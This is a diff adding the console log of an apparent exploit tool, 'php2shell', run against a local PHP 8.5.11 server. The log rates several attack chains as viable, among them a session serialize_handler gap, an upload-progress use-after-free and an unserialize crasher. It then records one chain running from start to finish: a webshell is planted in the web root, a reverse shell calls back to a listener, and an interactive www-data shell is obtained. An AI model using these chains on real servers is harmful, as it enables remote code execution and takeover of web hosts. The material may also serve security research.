@@ -1,0 +1,39 @@
+php2shell 1.0.0 — recon
+============================================================
+[+] X-Powered-By: PHP/8.5.11
+[*] multipart probe: 200 (0.00s)
+[*] fingerprinted: PHP 8.5.11
+============================================================
+CHAINS (post-recon viability for this target):
+  [sessgap  ] VIABLE  session serialize_handler gap -> key injection -> gadget -> webshell -> revshell
+        -> fires on ANY PHP version given the write/read handler divergence + an app destructor gadget (this is an app-config bug class, not a memory bug)
+  [zero4    ] N/A      (not a remote target)
+  [zero5    ] N/A      (not a remote target)
+  [uprog    ] VIABLE  rfc1867 upload-progress UAF arms (kill manifests)
+        -> PHP 8.5.11 <= 8.5.12 without the Oct-2026 patch (jammy 8.1.2-1ubuntu2.27 fleet + <=8.5.11 vanilla receipted; 8.3.36+/8.4.27+ have the patch)
+  [cformat  ] VIABLE  C: format internal-class crasher
+        -> crash/DoS class — needs an unserialize endpoint on target
+  [nativephp] NOT      NativePHP bridge: File.Copy -> AsyncTask spool poison -> unserialize
+        -> needs --native-bridge URL (the /_native/api/* surface)
+  [win-sess ] NOT      Windows session O_NOFOLLOW=0 file truncation
+        -> Windows victims only — this target is not Windows
+============================================================
+
+=== FIRE: [sessgap] session serialize_handler gap -> key injection -> gadget -> webshell -> revshell ===
+[*] gadget injection (124B) -> writes /var/www/html/p2s_shell.php
+[1] upload (slow key injection): HTTP 200
+[2] read side (/read.php): 200 — gadget destructor should have written the shell
+[+] WEBSHELL LIVE at http://127.0.0.1:8085/p2s_shell.php
+[+] RECEIPT: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+[3] revshell delivery: 200; waiting for callback...
+==== LIVE SESSION ====
+[*] listener on :1361
+[+] CONNECTION FROM 172.17.0.2:43026
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data
+PHP 8.5.11 (cli) (built: Oct 21 2026 00:25:58) (NTS)
+6.18.54.1-microsoft-standard-WSL2
+
+[*] session captured
+
+[+] RECEIPT: interactive shell through the session-gap chain
